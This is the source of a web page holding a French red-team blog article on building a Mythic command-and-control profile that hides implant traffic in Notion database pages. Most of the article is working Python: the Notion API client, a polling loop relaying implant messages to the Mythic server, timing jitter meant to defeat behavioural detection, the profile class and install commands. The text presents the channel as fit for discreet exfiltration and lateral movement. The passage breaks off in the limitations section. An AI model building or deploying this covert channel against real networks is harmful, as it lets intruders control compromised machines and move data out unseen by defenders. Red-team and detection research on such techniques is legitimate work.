import Link from "next/link";
import {
  ArrowLeft,
  Globe,
  Server,
  Database,
  Code2,
  Terminal,
  Zap,
  Heart,
  ArrowLeftRight,
  Package,
  Layers,
} from "lucide-react";
import { Button } from "@/components/ui/button";

function CodeBlock({
  children,
  title,
  result,
}: {
  children: string;
  title?: string;
  result?: boolean;
}) {
  const label = result ? "Résultat" : title;
  return (
    <div className="my-4">
      {label && (
        <p
          className={`mb-1 text-xs font-mono ${
            result ? "text-primary" : "text-muted-foreground"
          }`}
        >
          {label}
        </p>
      )}
      <pre className="overflow-x-auto rounded-lg border border-border bg-card p-4 font-mono text-sm text-muted-foreground">
        <code className="whitespace-pre">{children}</code>
      </pre>
    </div>
  );
}

function InfoBox({ children }: { children: React.ReactNode }) {
  return (
    <div className="my-4 rounded-lg border border-primary/30 bg-primary/5 px-5 py-4 text-sm text-muted-foreground">
      {children}
    </div>
  );
}

export const metadata = {
  title: "Quand Notion devient un canal C2 | 0xbbuddha",
  description:
    "Création d'un profil C2 Mythic qui utilise l'API Notion comme canal de communication covert. Living off Trusted Sites, architecture Mythic, implémentation Python.",
};

export default function ArticleNotionC2Page() {
  return (
    <div className="container mx-auto max-w-4xl px-4 py-12">
      <Button variant="ghost" size="sm" asChild className="mb-8 gap-2">
        <Link href="/blog">
          <ArrowLeft className="size-4" />
          Retour au blog
        </Link>
      </Button>

      <article className="space-y-12">
        {/* Header */}
        <header>
          <div className="flex flex-wrap gap-2 text-sm text-muted-foreground">
            <span className="font-mono text-primary">Red Team</span>
            <span>·</span>
            <span>Mythic</span>
            <span>·</span>
            <span>C2</span>
            <span>·</span>
            <span>2026-03-20</span>
          </div>
          <h1 className="mt-2 font-mono text-3xl font-bold tracking-tight sm:text-4xl">
            Quand Notion devient un canal C2
          </h1>
          <p className="mt-3 text-lg text-muted-foreground">
            Création d&apos;un profil Mythic C2 qui détourne l&apos;API Notion
            comme canal de communication covert. Living off Trusted Sites,
            pages de base de données comme vecteur de transport, et intégration
            complète dans le framework Mythic.
          </p>
        </header>

        {/* Section personnelle */}
        <section className="rounded-lg border border-primary/20 bg-primary/5 p-6">
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Heart className="size-5 text-primary" />
            L&apos;idée
          </h2>
          <p className="text-muted-foreground mb-3">
            Tout est parti d&apos;un truc simple : chercher des canaux de
            communication qui passent inaperçus. Pas parce que les outils
            classiques sont mauvais, mais parce que les équipes de défense
            s&apos;améliorent. Un agent qui fait du HTTP vers une IP louche,
            ça se détecte. Un agent qui tape{" "}
            <code className="rounded bg-muted px-1">api.notion.com</code>,
            c&apos;est une autre histoire.
          </p>
          <p className="text-muted-foreground mb-3">
            La technique s&apos;appelle{" "}
            <strong>Living off Trusted Sites</strong> (LoTS). Le principe :
            utiliser des services légitimes, whitelistés dans les firewalls
            d&apos;entreprise, comme infrastructure C2 —
            Slack, Teams, GitHub, OneDrive, Notion. Le trafic est chiffré en
            TLS, il se noie dans le reste du SaaS, et personne ne va bloquer
            Notion sans casser des flows métier.
          </p>
          <p className="text-muted-foreground mb-3">
            J&apos;avais déjà vu des implémentations similaires sur d&apos;autres
            frameworks. L&apos;idée de le faire pour{" "}
            <strong>Mythic</strong> m&apos;intéressait surtout pour comprendre
            comment le système de profils C2 fonctionne vraiment de
            l&apos;intérieur. Coder le profil était le meilleur moyen
            d&apos;apprendre.
          </p>
          <p className="text-muted-foreground">
            Résultat : un container Docker qui poll une base de données Notion
            à intervalles réguliers et fait le pont avec le serveur Mythic.
            Toute la communication passe par des pages Notion. Depuis
            l&apos;extérieur, c&apos;est juste quelqu&apos;un qui utilise
            l&apos;API.
          </p>
        </section>

        {/* Sommaire */}
        <section className="rounded-lg border border-border bg-card p-6">
          <h2 className="mb-3 font-mono text-sm font-semibold text-primary uppercase tracking-widest">
            Sommaire
          </h2>
          <ol className="list-decimal list-inside space-y-1 text-sm text-muted-foreground font-mono">
            <li>C&apos;est quoi un profil C2 Mythic ?</li>
            <li>Design du canal — comment les messages transitent</li>
            <li>Setup Notion — intégration, base de données, propriétés</li>
            <li>notion_client.py — le client API</li>
            <li>main.py — la boucle de polling côté serveur</li>
            <li>Notion.py — la classe C2Profile Mythic</li>
            <li>Installation dans Mythic</li>
            <li>Limitations et considérations OPSEC</li>
          </ol>
        </section>

        {/* 1. Architecture Mythic */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Layers className="size-5 text-primary" />
            1. C&apos;est quoi un profil C2 Mythic ?
          </h2>
          <p className="text-muted-foreground mb-3">
            Mythic est un framework C2 modulaire développé par{" "}
            <strong>its-a-feature</strong>. Son architecture repose sur des
            conteneurs Docker indépendants qui communiquent via RabbitMQ. Chaque
            composant (agent, profil C2, service de traduction) tourne dans
            son propre container et parle à Mythic via une interface bien
            définie.
          </p>
          <p className="text-muted-foreground mb-3">
            Un <strong>profil C2</strong> dans Mythic, c&apos;est le composant
            qui s&apos;occupe du transport. Le serveur Mythic ne sait pas comment
            un agent communique : HTTP, DNS, Slack, peu importe. C&apos;est le
            profil C2 qui reçoit les données brutes de l&apos;agent, les
            transmet au serveur Mythic via son API interne, récupère la réponse,
            et la renvoie à l&apos;agent. Le profil est donc un <em>proxy</em>{" "}
            entre le canal de communication choisi et le cœur de Mythic.
          </p>
          <InfoBox>
            <strong>mythic_container</strong> : la bibliothèque Python fournie
            par Mythic pour créer des profils C2. Elle expose les classes de
            base, les types de paramètres, et le service qui connecte le
            container à l&apos;orchestrateur Mythic via RabbitMQ.
          </InfoBox>
          <p className="text-muted-foreground mb-3">
            Concrètement, un profil C2 Mythic c&apos;est :
          </p>
          <ul className="list-disc list-inside space-y-2 text-sm text-muted-foreground mb-4">
            <li>
              Un <strong>Dockerfile</strong> qui décrit le container
            </li>
            <li>
              Une classe Python qui hérite de{" "}
              <code className="rounded bg-muted px-1">C2Profile</code> avec les
              paramètres exposés dans l&apos;UI Mythic
            </li>
            <li>
              Un <strong>script serveur</strong> qui tourne en permanence et
              fait le vrai travail de transport
            </li>
          </ul>
          <p className="text-muted-foreground mb-3">
            Quand Mythic démarre le container, il écrit un{" "}
            <code className="rounded bg-muted px-1">config.json</code> avec les
            paramètres configurés dans l&apos;UI, puis lance le script serveur.
            Le script lit ce config et démarre sa boucle de travail.
          </p>
          <CodeBlock title="Architecture globale">
{`Agent                    Notion (SaaS)              C2 Container           Mythic Server
  │                           │                           │                        │
  ├── POST /v1/pages ────────►│                           │                        │
  │   direction=in            │◄── query (direction=in) ──┤                        │
  │   base64(données)         │    processed=false        │                        │
  │                           │                           ├── POST /agent_msg ────►│
  │                           │                           │◄── réponse chiffrée ───┤
  │                           │◄── POST /v1/pages ────────┤                        │
  │                           │    direction=out          │                        │
  │                           │◄── PATCH /v1/pages/{id} ──┤ mark_processed         │
  │                           │    processed=true,archived│ (page direction=in)    │
  │◄── query (direction=out) ─┤                           │                        │
  │    processed=false        │                           │                        │
  ├── PATCH /v1/pages/{id} ──►│                           │                        │
  │   processed=true          │                           │                        │
  │                           │◄── PATCH /v1/pages/{id} ──┤ archive_page           │
  │                           │    archived=true          │ (cleanup direction=out)│`}
          </CodeBlock>
        </section>

        {/* 2. Design du canal */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <ArrowLeftRight className="size-5 text-primary" />
            2. Design du canal
          </h2>
          <p className="text-muted-foreground mb-3">
            La première question à résoudre : comment faire transiter des
            messages binaires arbitraires via Notion ? L&apos;API Notion expose
            des bases de données et des pages, pas un canal de messages. Il
            faut donc modéliser la communication C2 avec ces primitives.
          </p>
          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Une page = un message
          </h3>
          <p className="text-muted-foreground mb-3">
            Chaque message C2 devient une page dans une base de données Notion
            partagée. La direction du message est stockée dans une propriété{" "}
            <code className="rounded bg-muted px-1">Select</code> :{" "}
            <code className="rounded bg-muted px-1">in</code> pour agent→serveur,{" "}
            <code className="rounded bg-muted px-1">out</code> pour serveur→agent.
            Une propriété{" "}
            <code className="rounded bg-muted px-1">processed</code> (checkbox)
            marque les messages déjà traités. Le payload, lui, ne peut pas aller
            dans une propriété texte.
          </p>
          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Le problème de la limite des 2000 caractères
          </h3>
          <p className="text-muted-foreground mb-3">
            L&apos;API Notion plafonne les propriétés de type texte à{" "}
            <strong>2000 caractères</strong>. Or un message C2 peut facilement
            dépasser ça, notamment lors de l&apos;enrôlement (checkin) ou du
            retour d&apos;une commande avec un output conséquent. Stocker le
            payload dans une propriété texte est donc exclu.
          </p>
          <p className="text-muted-foreground mb-3">
            La solution : stocker le payload dans le <strong>corps de la page</strong>,
            sous forme de blocs{" "}
            <code className="rounded bg-muted px-1">code</code>. Les blocs de
            code sont aussi limités à 2000 chars, mais rien n&apos;empêche
            d&apos;en créer plusieurs. Le payload est encodé en base64 puis
            découpé en chunks de 1800 caractères, chaque chunk dans son propre
            bloc. La lecture reconstruit la chaîne en concaténant les blocs dans
            l&apos;ordre.
          </p>
          <CodeBlock title="Chunking du payload">
{`encoded = base64.b64encode(data).decode()
CHUNK_SIZE = 1800

chunks = [encoded[i : i + CHUNK_SIZE] for i in range(0, len(encoded), CHUNK_SIZE)]

# Chaque chunk → un bloc "code" dans le corps de la page Notion
children = [
    {
        "object": "block",
        "type": "code",
        "code": {
            "language": "plain text",
            "rich_text": [{"type": "text", "text": {"content": chunk}}],
        },
    }
    for chunk in chunks
]`}
          </CodeBlock>
          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Cycle de vie d&apos;un message
          </h3>
          <p className="text-muted-foreground mb-3">
            La boucle est simple : le container poll les pages{" "}
            <code className="rounded bg-muted px-1">direction=in</code> non
            traitées, les transmet à Mythic, poste la réponse en{" "}
            <code className="rounded bg-muted px-1">direction=out</code>, puis
            archive les pages traitées. Les pages archivées disparaissent de la
            vue de la base de données, elles ne s&apos;accumulent pas.
            L&apos;agent côté implant fait l&apos;inverse : il crée des pages{" "}
            <code className="rounded bg-muted px-1">in</code> et poll les pages{" "}
            <code className="rounded bg-muted px-1">out</code> qui lui sont
            destinées via son{" "}
            <code className="rounded bg-muted px-1">agent_id</code>.
          </p>
        </section>

        {/* 3. Setup Notion */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Database className="size-5 text-primary" />
            3. Setup Notion
          </h2>
          <p className="text-muted-foreground mb-3">
            Avant de coder quoi que ce soit, il faut préparer le côté Notion.
            Deux choses : une <strong>intégration</strong> (pour avoir un token
            API) et une <strong>base de données</strong> (qui servira de
            messagerie).
          </p>
          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Créer l&apos;intégration
          </h3>
          <p className="text-muted-foreground mb-3">
            Sur{" "}
            <code className="rounded bg-muted px-1">notion.so/my-integrations</code>
            , créer une nouvelle intégration interne. Le token généré commence
            par <code className="rounded bg-muted px-1">ntn_</code> (ou{" "}
            <code className="rounded bg-muted px-1">secret_</code> pour les
            anciens tokens). C&apos;est ce token qui sera passé en paramètre
            à Mythic.
          </p>
          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Créer la base de données
          </h3>
          <p className="text-muted-foreground mb-3">
            La base de données doit avoir exactement ces propriétés :
          </p>
          <div className="overflow-x-auto my-4">
            <table className="w-full text-sm font-mono border-collapse">
              <thead>
                <tr className="border-b border-border">
                  <th className="text-left py-2 pr-4 text-muted-foreground font-semibold">Propriété</th>
                  <th className="text-left py-2 pr-4 text-muted-foreground font-semibold">Type Notion</th>
                  <th className="text-left py-2 text-muted-foreground font-semibold">Rôle</th>
                </tr>
              </thead>
              <tbody className="text-muted-foreground">
                <tr className="border-b border-border/50">
                  <td className="py-2 pr-4"><code className="rounded bg-muted px-1">uuid</code></td>
                  <td className="py-2 pr-4">Title</td>
                  <td className="py-2">Identifiant unique du message (UUID v4)</td>
                </tr>
                <tr className="border-b border-border/50">
                  <td className="py-2 pr-4"><code className="rounded bg-muted px-1">direction</code></td>
                  <td className="py-2 pr-4">Select</td>
                  <td className="py-2">Options : <code className="rounded bg-muted px-1">in</code> ou <code className="rounded bg-muted px-1">out</code></td>
                </tr>
                <tr className="border-b border-border/50">
                  <td className="py-2 pr-4"><code className="rounded bg-muted px-1">agent_id</code></td>
                  <td className="py-2 pr-4">Text</td>
                  <td className="py-2">UUID de l&apos;agent concerné</td>
                </tr>
                <tr className="border-b border-border/50">
                  <td className="py-2 pr-4"><code className="rounded bg-muted px-1">processed</code></td>
                  <td className="py-2 pr-4">Checkbox</td>
                  <td className="py-2">Coché une fois le message consommé</td>
                </tr>
                <tr>
                  <td className="py-2 pr-4"><code className="rounded bg-muted px-1">size</code></td>
                  <td className="py-2 pr-4">Number</td>
                  <td className="py-2">Taille du payload décodé en octets</td>
                </tr>
              </tbody>
            </table>
          </div>
          <p className="text-muted-foreground mb-3">
            La propriété{" "}
            <code className="rounded bg-muted px-1">created_time</code> est
            ajoutée automatiquement par Notion, utile pour trier
            les messages par ordre d&apos;arrivée lors des queries.
          </p>
          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Partager la base avec l&apos;intégration
          </h3>
          <p className="text-muted-foreground mb-3">
            Ouvrir la base de données → <strong>Share</strong> → inviter
            l&apos;intégration. Sans ça, le token n&apos;a aucun accès à la
            base et toutes les requêtes retournent une 404.
          </p>
          <p className="text-muted-foreground mb-3">
            Le <strong>database ID</strong> se récupère dans l&apos;URL Notion :
          </p>
          <CodeBlock title="Format de l'URL Notion">
{`https://notion.so/your-workspace/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx?v=...
                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                  32 caractères = database ID`}
          </CodeBlock>
        </section>

        {/* 4. notion_client.py */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Code2 className="size-5 text-primary" />
            4. notion_client.py — Le client API
          </h2>
          <p className="text-muted-foreground mb-3">
            C&apos;est la couche d&apos;abstraction sur l&apos;API Notion. Toutes
            les interactions avec Notion passent par là : création de pages,
            queries, lecture des blocs, marquage comme traité, archivage. Le
            reste du code ne connaît pas l&apos;API Notion, il appelle juste
            ces méthodes.
          </p>
          <p className="text-muted-foreground mb-3">
            La classe utilise{" "}
            <code className="rounded bg-muted px-1">httpx</code> en mode async,
            cohérent avec la boucle asyncio du serveur. Tous les appels API sont
            faits avec un timeout de 30s, suffisant pour l&apos;API Notion qui
            est assez réactive, mais suffisamment court pour ne pas bloquer la
            boucle si le réseau est capricieux.
          </p>
          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Créer un message — create_message()
          </h3>
          <p className="text-muted-foreground mb-3">
            Encode les données brutes en base64, découpe en chunks de 1800 chars,
            crée une page dans la base avec les bonnes propriétés, et place les
            chunks dans des blocs{" "}
            <code className="rounded bg-muted px-1">code</code> dans le corps.
            Cette méthode est fournie comme référence pour l&apos;agent côté
            implant — le serveur lui n&apos;appelle pas{" "}
            <code className="rounded bg-muted px-1">create_message()</code>, il
            utilise{" "}
            <code className="rounded bg-muted px-1">create_response_page()</code>{" "}
            pour les pages <code className="rounded bg-muted px-1">direction=out</code>.
          </p>
          <CodeBlock title="notion_client.py — create_message()">
{`async def create_message(self, agent_id: str, data: bytes, direction: str) -> str:
    encoded = base64.b64encode(data).decode()
    chunks = [encoded[i : i + CHUNK_SIZE] for i in range(0, len(encoded), CHUNK_SIZE)]

    children = [
        {
            "object": "block",
            "type": "code",
            "code": {
                "language": "plain text",
                "rich_text": [{"type": "text", "text": {"content": chunk}}],
            },
        }
        for chunk in chunks
    ]

    payload = {
        "parent": {"database_id": self.database_id},
        "properties": {
            "uuid":      {"title": [{"text": {"content": str(uuid.uuid4())}}]},
            "direction": {"select": {"name": direction}},
            "agent_id":  {"rich_text": [{"text": {"content": agent_id}}]},
            "processed": {"checkbox": False},
            "size":      {"number": len(data)},
        },
        "children": children,
    }

    async with httpx.AsyncClient() as client:
        resp = await client.post(
            f"{NOTION_API_BASE}/pages",
            headers=self.headers,
            json=payload,
            timeout=30.0,
        )
        resp.raise_for_status()
        return resp.json()["id"]`}
          </CodeBlock>
          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Lire un message — read_message_data()
          </h3>
          <p className="text-muted-foreground mb-3">
            Récupère les blocs enfants de la page, concatène le contenu des
            blocs de type{" "}
            <code className="rounded bg-muted px-1">code</code> dans l&apos;ordre,
            et retourne la chaîne base64 encodée en UTF-8. C&apos;est exactement
            ce format que Mythic attend sur son endpoint{" "}
            <code className="rounded bg-muted px-1">/agent_message</code>.
          </p>
          <CodeBlock title="notion_client.py — read_message_data()">
{`async def read_message_data(self, page_id: str) -> bytes:
    async with httpx.AsyncClient() as client:
        resp = await client.get(
            f"{NOTION_API_BASE}/blocks/{page_id}/children",
            headers=self.headers,
            timeout=30.0,
        )
        resp.raise_for_status()
        blocks = resp.json().get("results", [])

    encoded = ""
    for block in blocks:
        if block.get("type") == "code":
            for rt in block["code"].get("rich_text", []):
                encoded += rt["text"]["content"]

    return encoded.encode("utf-8")`}
          </CodeBlock>
          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Marquer comme traité — mark_processed()
          </h3>
          <p className="text-muted-foreground mb-3">
            Un PATCH sur la page pour cocher{" "}
            <code className="rounded bg-muted px-1">processed</code> et passer
            la page en archivée. Pages archivées = invisibles dans la vue de la
            base, mais accessibles via l&apos;API si besoin. C&apos;est le
            nettoyage automatique pour éviter que la base s&apos;accumule.
          </p>
          <CodeBlock title="notion_client.py — mark_processed()">
{`async def mark_processed(self, page_id: str) -> None:
    async with httpx.AsyncClient() as client:
        resp = await client.patch(
            f"{NOTION_API_BASE}/pages/{page_id}",
            headers=self.headers,
            json={
                "properties": {"processed": {"checkbox": True}},
                "archived": True,
            },
            timeout=30.0,
        )
        resp.raise_for_status()`}
          </CodeBlock>
          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Un détail sur les réponses serveur — create_response_page()
          </h3>
          <p className="text-muted-foreground mb-3">
            Pour les messages direction{" "}
            <code className="rounded bg-muted px-1">out</code> (réponse
            serveur→agent), Mythic retourne directement du base64. Il ne faut
            pas ré-encoder. La méthode{" "}
            <code className="rounded bg-muted px-1">create_response_page()</code>{" "}
            stocke donc le base64 brut tel quel dans les blocs, sans passer par{" "}
            <code className="rounded bg-muted px-1">base64.b64encode()</code>.
            L&apos;agent côté implant lira cette chaîne directement, sans
            décodage supplémentaire à cette couche. C&apos;est un point qui
            m&apos;a coûté du debug au départ : deux couches de base64 et
            Mythic ne reconnaît plus le message.
          </p>
        </section>

        {/* 5. main.py */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Server className="size-5 text-primary" />
            5. main.py — La boucle de polling
          </h2>
          <p className="text-muted-foreground mb-3">
            C&apos;est le script qui tourne en permanence dans le container.
            Trois responsabilités : charger la configuration, faire le pont avec
            Mythic, et gérer le nettoyage des pages traitées.
          </p>
          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Chargement de la config
          </h3>
          <p className="text-muted-foreground mb-3">
            Mythic écrit le{" "}
            <code className="rounded bg-muted px-1">config.json</code> au
            démarrage du container, dans le même répertoire que{" "}
            <code className="rounded bg-muted px-1">main.py</code>. La fonction{" "}
            <code className="rounded bg-muted px-1">load_config()</code> gère
            deux cas : le fichier existe (production) ou non (dev local, avec
            les variables d&apos;environnement comme fallback).
          </p>
          <p className="text-muted-foreground mb-3">
            Mythic peut aussi wrapper les paramètres sous une clé{" "}
            <code className="rounded bg-muted px-1">instances</code>, un détail
            de l&apos;implémentation de{" "}
            <code className="rounded bg-muted px-1">mythic-cli</code> selon la
            version. Le code le gère explicitement.
          </p>
          <CodeBlock title="main.py — load_config()">
{`def load_config() -> dict:
    config_path = Path(__file__).parent / "config.json"
    if config_path.exists():
        with open(config_path) as f:
            data = json.load(f)
        # Mythic wraps parfois les params sous "instances"
        if "instances" in data and isinstance(data["instances"], list) and data["instances"]:
            data = data["instances"][0]
        return data

    # Fallback dev local : variables d'environnement
    return {
        "integration_token": os.environ.get("NOTION_TOKEN", ""),
        "database_id":       os.environ.get("NOTION_DB_ID", ""),
        "callback_interval": int(os.environ.get("CALLBACK_INTERVAL", "10")),
        "callback_jitter":   int(os.environ.get("CALLBACK_JITTER", "10")),
    }`}
          </CodeBlock>
          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Forward vers Mythic — forward_to_mythic()
          </h3>
          <p className="text-muted-foreground mb-3">
            Mythic expose un endpoint interne sur le réseau Docker :{" "}
            <code className="rounded bg-muted px-1">http://mythic_server:17443/agent_message</code>.
            Le profil C2 POST les données brutes de l&apos;agent à cet endpoint,
            avec un header{" "}
            <code className="rounded bg-muted px-1">mythic: notion</code> qui
            identifie le profil. Mythic décrypte, traite, et retourne la réponse
            chiffrée.
          </p>
          <CodeBlock title="main.py — forward_to_mythic()">
{`MYTHIC_AGENT_URL = f"http://{MYTHIC_SERVER_HOST}:{MYTHIC_SERVER_PORT}/agent_message"

async def forward_to_mythic(data: bytes) -> bytes:
    async with httpx.AsyncClient() as client:
        resp = await client.post(
            MYTHIC_AGENT_URL,
            content=data,
            headers={
                "Content-Type": "application/octet-stream",
                "mythic": "notion",
            },
            timeout=30.0,
        )
        resp.raise_for_status()
        return resp.content`}
          </CodeBlock>
          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            La boucle principale — poll_loop()
          </h3>
          <p className="text-muted-foreground mb-3">
            À chaque itération : query les pages{" "}
            <code className="rounded bg-muted px-1">direction=in</code> non
            traitées, pour chacune lire le payload, le forwarder à Mythic, poster
            la réponse en{" "}
            <code className="rounded bg-muted px-1">direction=out</code>, marquer
            la page originale comme traitée. Ensuite, un second pass pour
            archiver les pages{" "}
            <code className="rounded bg-muted px-1">direction=out</code> déjà
            marquées <code className="rounded bg-muted px-1">processed</code>{" "}
            par l&apos;agent. Puis on attend.
          </p>
          <CodeBlock title="main.py — poll_loop() (simplifié)">
{`async def poll_loop(notion: NotionClient, interval: int, jitter: int) -> None:
    while True:
        # 1. Traiter les messages entrants
        pages = await notion.query_pending(direction="in")
        for page in pages:
            page_id  = page["id"]
            agent_id = NotionClient.get_agent_id(page)

            data     = await notion.read_message_data(page_id)
            response = await forward_to_mythic(data)

            await notion.create_response_page(agent_id, response, direction="out")
            await notion.mark_processed(page_id)

        # 2. Nettoyer les pages "out" déjà consommées par l'agent
        stale = await notion.query_processed_out()
        for page in stale:
            await notion.archive_page(page["id"])

        # 3. Attendre avec jitter
        await asyncio.sleep(compute_sleep(interval, jitter))`}
          </CodeBlock>
          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Jitter
          </h3>
          <p className="text-muted-foreground mb-3">
            Le jitter est un pourcentage appliqué à l&apos;intervalle. Si
            l&apos;intervalle est 10s et le jitter 20%, le sleep sera entre 8 et
            12 secondes, tiré aléatoirement à chaque itération. C&apos;est une
            mesure de base contre la détection comportementale qui cherche des
            patterns de timing réguliers.
          </p>
          <CodeBlock title="main.py — compute_sleep()">
{`def compute_sleep(interval: int, jitter: int) -> float:
    if jitter <= 0:
        return float(interval)
    delta = interval * (jitter / 100.0)
    return max(1.0, interval + random.uniform(-delta, delta))`}
          </CodeBlock>
        </section>

        {/* 6. Notion.py */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Package className="size-5 text-primary" />
            6. Notion.py — La classe C2Profile
          </h2>
          <p className="text-muted-foreground mb-3">
            C&apos;est le point d&apos;entrée que Mythic charge via{" "}
            <code className="rounded bg-muted px-1">mythic_container</code>. Il
            déclare le profil, ses métadonnées, ses paramètres, et démarre le
            service qui connecte le container à l&apos;orchestrateur Mythic.
          </p>
          <p className="text-muted-foreground mb-3">
            La classe hérite de{" "}
            <code className="rounded bg-muted px-1">C2Profile</code>. Quelques
            attributs importants :
          </p>
          <ul className="list-disc list-inside space-y-2 text-sm text-muted-foreground mb-4">
            <li>
              <code className="rounded bg-muted px-1">is_p2p_c2 = False</code> :
              canal direct server-routed, pas peer-to-peer
            </li>
            <li>
              <code className="rounded bg-muted px-1">is_server_routed = True</code> :
              le serveur Mythic route les messages vers les agents
            </li>
            <li>
              <code className="rounded bg-muted px-1">mythic_encrypts = True</code> :
              Mythic gère le chiffrement, le profil ne voit que du base64 opaque
            </li>
            <li>
              <code className="rounded bg-muted px-1">server_binary_path</code> :
              chemin vers le script Python que Mythic lancera au démarrage du
              container
            </li>
          </ul>
          <CodeBlock title="mythic/c2_functions/Notion.py">
{`from mythic_container.C2ProfileBase import C2Profile, C2ProfileParameter, ParameterType
import mythic_container.mythic_service
import pathlib


class notion(C2Profile):
    name        = "notion"
    description = (
        "C2 channel using Notion as a covert transport. "
        "Leverages the Notion API to store tasks and results in a shared database, "
        "blending into legitimate SaaS traffic (Living off Trusted Sites)."
    )
    author           = "@bbuddha"
    is_p2p_c2        = False
    is_server_routed = True
    mythic_encrypts  = True

    server_folder_path = pathlib.Path(__file__).parent.parent.parent / "c2_code"
    server_binary_path = server_folder_path / "main.py"

    parameters = [
        C2ProfileParameter(
            name="integration_token",
            description="Notion Integration Token (ntn_...)",
            parameter_type=ParameterType.String,
            required=True,
        ),
        C2ProfileParameter(
            name="database_id",
            description="ID de la base de données Notion (32 caractères dans l'URL)",
            parameter_type=ParameterType.String,
            required=True,
        ),
        C2ProfileParameter(
            name="callback_interval",
            description="Intervalle de polling en secondes",
            default_value="10",
            parameter_type=ParameterType.Number,
            required=False,
        ),
        C2ProfileParameter(
            name="callback_jitter",
            description="Jitter en % appliqué à l'intervalle (0-50)",
            default_value="10",
            parameter_type=ParameterType.Number,
            required=False,
        ),
    ]


mythic_container.mythic_service.start_and_run_forever()`}
          </CodeBlock>
          <InfoBox>
            L&apos;appel à{" "}
            <code className="rounded bg-muted px-1">start_and_run_forever()</code>{" "}
            à la fin du fichier est essentiel : c&apos;est lui qui connecte le
            container à RabbitMQ et maintient la connexion avec Mythic. Sans ça,
            le container démarre, enregistre le profil, et sort immédiatement.
          </InfoBox>
        </section>

        {/* 7. Installation */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Terminal className="size-5 text-primary" />
            7. Installation dans Mythic
          </h2>
          <p className="text-muted-foreground mb-3">
            Mythic fournit un outil CLI,{" "}
            <code className="rounded bg-muted px-1">mythic-cli</code>, pour
            installer des profils C2 et des agents. L&apos;installation
            télécharge le repo, construit l&apos;image Docker, et enregistre
            le profil dans Mythic.
          </p>
          <CodeBlock title="Installation depuis GitHub">
{`cd /opt/Mythic
./mythic-cli install github https://github.com/0xbbuddha/notion-c2`}
          </CodeBlock>
          <p className="text-muted-foreground mb-3">
            Ou depuis une copie locale :
          </p>
          <CodeBlock title="Installation depuis un dossier local">
{`./mythic-cli install folder /chemin/vers/notion-c2`}
          </CodeBlock>
          <p className="text-muted-foreground mb-3">
            Une fois installé, le profil apparaît dans l&apos;UI Mythic sous{" "}
            <strong>C2 Profiles → notion</strong>. Il faut le démarrer et
            renseigner les deux paramètres obligatoires :
          </p>
          <ul className="list-disc list-inside space-y-1 text-sm text-muted-foreground mb-4">
            <li>
              <code className="rounded bg-muted px-1">integration_token</code> —
              le token Notion (<code className="rounded bg-muted px-1">ntn_...</code>)
            </li>
            <li>
              <code className="rounded bg-muted px-1">database_id</code> : les
              32 caractères de l&apos;URL de la base
            </li>
          </ul>
          <p className="text-muted-foreground mb-3">
            Le{" "}
            <code className="rounded bg-muted px-1">config.json</code> correspondant
            généré par Mythic ressemble à ça :
          </p>
          <CodeBlock title="config.json (exemple)">
{`{
  "integration_token": "ntn_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
  "database_id": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "callback_interval": 10,
  "callback_jitter": 10
}`}
          </CodeBlock>
          <p className="text-muted-foreground mb-3">
            Pour implémenter le côté agent (l&apos;implant), il faut que
            l&apos;agent implémente deux opérations contre l&apos;API Notion :
            créer des pages{" "}
            <code className="rounded bg-muted px-1">direction=in</code> pour
            envoyer des données, et requêter les pages{" "}
            <code className="rounded bg-muted px-1">direction=out</code>{" "}
            filtrées par son{" "}
            <code className="rounded bg-muted px-1">agent_id</code> pour
            recevoir les réponses. Le{" "}
            <code className="rounded bg-muted px-1">notion_client.py</code>{" "}
            fourni dans le repo sert de référence d&apos;implémentation.
          </p>
        </section>

        {/* 8. Limitations */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Zap className="size-5 text-primary" />
            8. Limitations et considérations OPSEC
          </h2>
          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Rate limit Notion
          </h3>
          <p className="text-muted-foreground mb-3">
            L&apos;API Notion est limitée à environ{" "}
            <strong>3 requêtes par seconde</strong>. Chaque message C2 génère
            plusieurs appels : création de page, lecture des blocs, PATCH pour
            archiver. Avec plusieurs agents actifs en même temps, les 429 se
            cumulent vite. Garder un{" "}
            <code className="rounded bg-muted px-1">callback_interval</code>{" "}
            d&apos;au moins 5s et ne pas descendre en dessous.
          </p>
          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Latence
          </h3>
          <p className="text-muted-foreground mb-3">
            Le modèle de polling introduit une latence inhérente. Une commande
            exécutée sur l&apos;agent ne remonte pas avant le prochain cycle de
            polling. Avec un intervalle de 10s et du jitter, on est sur des
            boucles de 8 à 12 secondes minimum par aller-retour. Acceptable
            pour de l&apos;exfiltration ou du mouvement latéral discret, pas
            pour une session interactive.
          </p>
